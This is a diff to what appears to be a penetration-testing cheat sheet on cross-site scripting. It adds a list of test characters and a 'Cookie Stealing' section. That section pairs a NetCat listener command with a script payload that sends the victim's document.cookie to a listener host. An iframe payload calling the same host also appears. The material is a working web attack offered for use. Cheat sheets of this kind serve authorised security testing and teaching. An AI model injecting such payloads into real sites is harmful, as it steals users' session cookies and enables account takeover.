@@ -11,6 +11,15 @@ weight : 0
 
 ## Cross-Site Scripting (XSS)
 
+## Test Characters
+
+```plain
+"
+;
+<
+>
+```
+
 ## Generic
 
 ```plain
@@ -51,6 +60,14 @@ In the example below, set up a NetCat listener on port 80 `sudo nc -nlvp 80`. Th
 
 ```plain
 <iframe src=http://10.10.10.10/report height="O" width="O"></iframe>
+```
+
+### Cookie Stealing
+
+In the example below, set up a NetCat listener on port 80 `sudo nc -nlvp 80`. This listener will receive a connection on success.
+
+```plain
+<script>new Image().src="http://10.10.10.10/nothinghere.jpg?output="+document.cookie;</script>
 ```
 
 ### WAF bypass
